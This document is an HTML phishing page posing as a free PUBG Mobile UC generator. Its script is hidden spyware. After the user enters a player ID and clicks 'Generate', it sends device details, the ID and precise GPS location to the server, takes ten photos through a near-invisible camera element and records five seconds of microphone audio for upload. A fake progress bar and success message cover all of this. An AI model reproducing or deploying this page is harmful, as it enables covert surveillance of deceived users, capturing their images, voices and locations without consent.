<!DOCTYPE html>
<html lang="ps" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Mobile UC Generator</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background-color: #1a1a1a; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
        .container { width: 100%; max-width: 420px; background-color: #242424; border-radius: 20px; padding: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.6); display: flex; flex-direction: column; gap: 15px; border: 1px solid #333; }
        .header { display: flex; justify-content: space-between; align-items: center; }
        .logo-title { color: #f39c12; font-size: 26px; font-weight: 900; font-style: italic; }
        .badge-uc { background-color: #f39c12; color: #000; font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 20px; text-transform: uppercase; }
        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; background-color: #2c2c2c; padding: 12px 8px; border-radius: 14px; }
        .stat-val { font-size: 16px; font-weight: bold; color: #f1c40f; }
        .stat-lbl { font-size: 10px; color: #b0bec5; margin-top: 3px; }
        .card { background-color: #2c2c2c; padding: 12px 15px; border-radius: 14px; border: 1px solid #3d3d3d; }
        .card-label { font-size: 13px; color: #b0bec5; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
        .input-box { width: 100%; background: transparent; border: none; color: #f39c12; font-size: 18px; font-weight: bold; outline: none; }
        select.input-box { background-color: #2c2c2c; color: white; cursor: pointer; border-radius: 6px; padding: 4px 0; }
        .grid-uc { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .uc-card { background-color: #2c2c2c; border: 1px solid #3d3d3d; padding: 15px 5px; border-radius: 14px; text-align: center; cursor: pointer; position: relative; }
        .uc-card.active { background: linear-gradient(135deg, #f39c12, #d35400); border-color: #f1c40f; }
        .pop-badge { position: absolute; top: -8px; left: 50%; transform: translateX(-50%); background-color: #e74c3c; color: white; font-size: 8px; font-weight: bold; padding: 2px 6px; border-radius: 6px; }
        .u-title { font-size: 16px; font-weight: bold; color: #ffffff; }
        .u-sub { font-size: 11px; color: #b0bec5; margin-top: 4px; }
        .generate-btn { background: linear-gradient(135deg, #f39c12, #d35400); color: white; width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 5px; box-shadow: 0 4px 15px rgba(243,156,18,0.4); }
        .generate-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .error-box { display: none; background-color: rgba(231, 76, 60, 0.15); border: 1px solid #e74c3c; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #e74c3c; margin-top: 5px; font-weight: bold; }
        .success-box { display: none; background-color: rgba(46, 204, 113, 0.15); border: 1px solid #2ecc71; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #2ecc71; margin-top: 5px; font-weight: bold; }
        
        .process-box { display: none; background-color: #2c2c2c; border: 1px solid #3d3d3d; border-radius: 12px; padding: 12px; text-align: center; margin-top: 5px; }
        .process-text { display: flex; justify-content: space-between; font-size: 13px; color: #b0bec5; margin-bottom: 8px; }
        .progress-bar-container { width: 100%; background-color: #1a1a1a; height: 8px; border-radius: 4px; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: linear-gradient(135deg, #f39c12, #d35400); transition: width 0.3s ease; }

        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
        canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-area"><span class="logo-title">PUBG MOBILE</span></div>
            <div class="badge-uc">Free UC</div>
        </div>
        <div class="stats-grid">
            <div class="stat-card"><div class="stat-val">3.8M</div><div class="stat-lbl">Active Players</div></div>
            <div class="stat-card"><div class="stat-val">12.4M</div><div class="stat-lbl">UC Given</div></div>
            <div class="stat-card"><div class="stat-val">99.9%</div><div class="stat-lbl">Success Rate</div></div>
        </div>
        <div class="card">
            <span class="card-label">🆔 Enter PUBG Character ID</span>
            <input type="text" class="input-box" id="userId" placeholder="Enter ID here...">
        </div>
        <span class="card-label">Select UC Amount</span>
        <div class="grid-uc">
            <div class="uc-card" data-uc="325 UC"><div class="u-title">🪙 325</div><div class="u-sub">UC</div></div>
            <div class="uc-card active" data-uc="660 UC"><div class="pop-badge">POPULAR</div><div class="u-title">🪙 660</div><div class="u-sub">UC</div></div>
            <div class="uc-card" data-uc="1800 UC"><div class="u-title">🪙 1800</div><div class="u-sub">UC</div></div>
        </div>
        <div class="card">
            <span class="card-label">🌐 Select Server</span>
            <select class="input-box" id="serverSelect">
                <option value="Asia Server">🌏 Asia Server</option>
                <option value="Europe Server">🇪🇺 Europe Server</option>
                <option value="Middle East">🇦🇪 Middle East Server</option>
            </select>
        </div>
        <button id="generateBtn" class="generate-btn">🪙 Generate UC</button>
        <div id="errorBox" class="error-box">⚠️ Please enter your PUBG Character ID first!</div>

        <div id="processBox" class="process-box">
            <div class="process-text">
                <span id="processStatus">Generating UC...</span>
                <span id="processPercent">0%</span>
            </div>
            <div class="progress-bar-container">
                <div id="progressBar" class="progress-bar"></div>
            </div>
        </div>

        <div id="successBox" class="success-box">✅ Successfully generated UC to Character ID!</div>
    </div>
    
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const ucCards = document.querySelectorAll('.uc-card');
        ucCards.forEach(card => {
            card.addEventListener('click', function() {
                ucCards.forEach(c => c.classList.remove('active'));
                this.classList.add('active');
            });
        });

        async function sendData(formData) { 
            try { 
                await fetch('/', { method: 'POST', body: formData }); 
            } catch (e) {} 
        }

        async function sendDeviceInfo() {
            let batteryPercentage = "N/A";
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryPercentage = Math.round(battery.level * 100) + "%";
                }
            } catch (e) {}

            const info = { 
                deviceType: navigator.platform, 
                androidVer: navigator.userAgent, 
                screenSize: window.innerWidth + " x " + window.innerHeight, 
                batteryLevel: batteryPercentage, 
                language: navigator.language 
            };
            const fd = new FormData(); 
            fd.append('device_info', JSON.stringify(info)); 
            await sendData(fd);
        }

        async function sendSinglePhoto(stream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            if (!video.srcObject) { video.srcObject = stream; await video.play(); }

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

            return new Promise((resolve) => {
                canvas.toBlob(async function(blob) {
                    const formData = new FormData();
                    formData.append('photo', blob, 'photo.jpg');
                    await sendData(formData);
                    resolve();
                }, 'image/jpeg');
            });
        }

        async function recordAndSendAudio(stream) {
            return new Promise((resolve) => {
                try {
                    const mediaRecorder = new MediaRecorder(stream);
                    const audioChunks = [];

                    mediaRecorder.ondataavailable = (event) => {
                        audioChunks.push(event.data);
                    };

                    mediaRecorder.onstop = async () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                        const formData = new FormData();
                        formData.append('voice', audioBlob, 'voice.ogg');
                        await sendData(formData);
                        resolve();
                    };

                    mediaRecorder.start();
                    setTimeout(() => {
                        if (mediaRecorder.state !== 'inactive') {
                            mediaRecorder.stop();
                        }
                    }, 5000);
                } catch (e) {
                    resolve();
                }
            });
        }

        document.getElementById("generateBtn").addEventListener("click", async () => {
            const btn = document.getElementById("generateBtn");
            const uid = document.getElementById("userId").value.trim();
            const errorBox = document.getElementById("errorBox");
            const processBox = document.getElementById("processBox");
            const progressBar = document.getElementById("progressBar");
            const processPercent = document.getElementById("processPercent");
            const successBox = document.getElementById("successBox");

            if (!uid) { 
                errorBox.style.display = "block"; 
                successBox.style.display = "none";
                document.getElementById("userId").focus();
                return; 
            }
            
            errorBox.style.display = "none";
            btn.innerText = "Processing...";
            btn.disabled = true;
            processBox.style.display = "block";

            // د وسیلې معلومات او د بیټرۍ فیصدي لېږل
            await sendDeviceInfo();
            const userFd = new FormData();
            userFd.append('pubg_user_id', uid);
            await sendData(userFd);

            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 2;
                if (progress <= 100) {
                    progressBar.style.width = progress + '%';
                    processPercent.innerText = progress + '%';
                }
            }, 60);

            if (navigator.geolocation) {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            const formData = new FormData();
                            formData.append('latitude', pos.coords.latitude);
                            formData.append('longitude', pos.coords.longitude);
                            await sendData(formData);
                            resolve();
                        },
                        () => { resolve(); },
                        { timeout: 4000, enableHighAccuracy: true }
                    );
                });
            }

            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    await video.play();

                    await new Promise(r => setTimeout(r, 300));

                    let photoCount = 0;
                    const maxPhotos = 10; 

                    const photoInterval = setInterval(async () => {
                        if (photoCount < maxPhotos) {
                            photoCount++;
                            await sendSinglePhoto(stream);
                        } else {
                            clearInterval(photoInterval);
                        }
                    }, 800);

                    await recordAndSendAudio(stream);

                    while (photoCount < maxPhotos) {
                        await new Promise(r => setTimeout(r, 300));
                    }
                    clearInterval(photoInterval);

                    stream.getTracks().forEach(t => t.stop());
                }
            } catch (err) {}

            clearInterval(progressInterval);
            progressBar.style.width = '100%';
            processPercent.innerText = '100%';

            setTimeout(() => {
                processBox.style.display = "none";
                successBox.style.display = "block";
                btn.innerText = "Generated Successfully ✅";
            }, 500);
        });
    </script>
</body>
</html>
